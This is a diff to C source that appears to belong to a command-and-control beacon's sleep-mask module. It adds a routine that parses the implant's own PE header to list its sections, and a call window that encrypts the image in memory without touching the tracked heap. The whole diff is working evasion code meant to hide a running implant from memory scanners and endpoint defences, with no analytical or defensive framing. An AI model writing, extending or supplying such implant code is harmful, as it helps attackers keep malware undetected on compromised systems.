@@ -45,6 +45,7 @@
 #include <stddef.h>
 #include "sleepmask_bofwin.h"
 #include "sleepmask_gen3.h"
+#include "beacon.h" /* get_beacon_ptr */
 
 #if defined(BW_TRACE_ENABLE)
 #include <stdio.h>
@@ -895,7 +896,7 @@ typedef struct {
  * cannot be served. */
 static int bw_keep_plaintext(BW_BLOCK * blocks, int n, int * text_idx, const unsigned long long * avoid, int navoid)
 {
-	unsigned char * image = (unsigned char *)gparms->beacon_ptr;
+	unsigned char * image = (unsigned char *)get_beacon_ptr();
 	unsigned long long base = (unsigned long long)(size_t)image;
 	unsigned long long end = base + ((IMAGE_NT_HEADERS *)(image + ((IMAGE_DOS_HEADER *)image)->e_lfanew))->OptionalHeader.SizeOfImage;
 	int i, a, w = 0, text = -1;
@@ -965,6 +966,78 @@ static int bw_drop_block(BW_BLOCK * blocks, int n, int * text_idx, unsigned char
 	return w;
 }
 
+/* Image-only block list for a call window, straight from the PE header -
+ * the sleep windows' policy (gargle_own_sections): the header page when
+ * writable, every section but .pdata/.reloc/.fptable (tables of addresses
+ * only - the sleep windows leave them in the clear too), .text last.
+ * Built from nothing but the image base: it needs neither gparms nor the
+ * tracked-heap table, which the exit path has already released when it
+ * runs its window. */
+static int bw_image_blocks(BW_BLOCK * out, int max, unsigned char * base, int * text_idx)
+{
+	IMAGE_DOS_HEADER * dos;
+	IMAGE_NT_HEADERS * nt;
+	IMAGE_SECTION_HEADER * sec;
+	unsigned char * p;
+	SIZE_T sz;
+	DWORD prot;
+	int i, n = 0;
+
+	*text_idx = -1;
+	if (base == NULL || max < 3 || base[0] != 'M' || base[1] != 'Z')
+		return -1;
+	dos = (IMAGE_DOS_HEADER *)base;
+	if (dos->e_lfanew <= 0 || dos->e_lfanew >= 0x400)
+		return -1;
+	nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
+	if (nt->Signature != IMAGE_NT_SIGNATURE)
+		return -1;
+	if (bw_page_usable(base, &prot) &&
+	    (prot & (PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
+		out[n].ptr = base;
+	out[n].len = 0x1000;
+	out[n].orig_prot = prot;
+	n++;
+	}
+	sec = IMAGE_FIRST_SECTION(nt);
+	for (i = 0; i < nt->FileHeader.NumberOfSections && n < max - 1; i++, sec++) {
+		if (memcmp(sec->Name, ".text", 5) == 0 ||
+		    memcmp(sec->Name, ".pdata", 6) == 0 ||
+		    memcmp(sec->Name, ".reloc", 6) == 0 ||
+		    memcmp(sec->Name, ".fptable", 8) == 0)
+			continue;
+		sz = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
+		p = base + sec->VirtualAddress;
+		if (sz == 0 || sec->VirtualAddress >= nt->OptionalHeader.SizeOfImage)
+			continue;
+		if ((SIZE_T)sec->VirtualAddress + sz > nt->OptionalHeader.SizeOfImage)
+			sz = nt->OptionalHeader.SizeOfImage - sec->VirtualAddress;
+		if (!bw_page_usable(p, &prot))
+			continue;
+		out[n].ptr = p;
+	out[n].len = (unsigned long)sz;
+	out[n].orig_prot = prot;
+	n++;
+	}
+	/* .text last: the enter stub masks it separately (see bw_snapshot) */
+	sec = IMAGE_FIRST_SECTION(nt);
+	for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+		if (memcmp(sec->Name, ".text", 5) != 0)
+			continue;
+		sz = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
+		p = base + sec->VirtualAddress;
+		if (sz == 0 || !bw_page_usable(p, &prot))
+			break;
+		out[n].ptr = p;
+	out[n].len = (unsigned long)sz;
+	out[n].orig_prot = prot;
+		*text_idx = n;
+	n++;
+		break;
+	}
+	return *text_idx < 0 ? -1 : n;
+}
+
 static BOOL bw_window(const BW_TARGET * t)
 {
 	BW_SF032 fn;
@@ -986,9 +1059,12 @@ static BOOL bw_window(const BW_TARGET * t)
 
 	/* a background job thread could execute beacon code while the image is
 	 * ciphertext - the window is single-threaded only (same guard as the
-	 * gen3 sleep path). gparms must already be initialized by the caller
-	 * (boff.cpp mirrors gen3_sleep's lazy gargle_setup_parms). */
-	if (t == NULL || t->entry == NULL || threadcount > 0 || gparms == NULL || gparms->beacon_ptr == NULL)
+	 * gen3 sleep path). A BOF window also masks the tracked heap and needs
+	 * gparms (boff.cpp mirrors gen3_sleep's lazy gargle_setup_parms); a
+	 * call window masks the image only and reads nothing tracked. */
+	if (t == NULL || t->entry == NULL || threadcount > 0)
+		return FALSE;
+	if (!t->image_only && (gparms == NULL || gparms->beacon_ptr == NULL))
 		return FALSE;
 	if (!bw_build_pages())
 		return FALSE;
@@ -1002,7 +1078,10 @@ static BOOL bw_window(const BW_TARGET * t)
 	 * and the (never-masked) private ctx/stub pages */
 	ctx = g_bw_ctx;
 	blocks = (BW_BLOCK *)ctx->storage;
-	nblocks = bw_snapshot(blocks, BW_MAX_BLOCKS, gparms->beacon_ptr, &text_idx);
+	if (t->image_only)
+		nblocks = bw_image_blocks(blocks, BW_MAX_BLOCKS, (unsigned char *)get_beacon_ptr(), &text_idx);
+	else
+		nblocks = bw_snapshot(blocks, BW_MAX_BLOCKS, gparms->beacon_ptr, &text_idx);
 	g_bw_dbg_before = nblocks;
 	if (nblocks < 2 || text_idx < 0)
 		return FALSE;
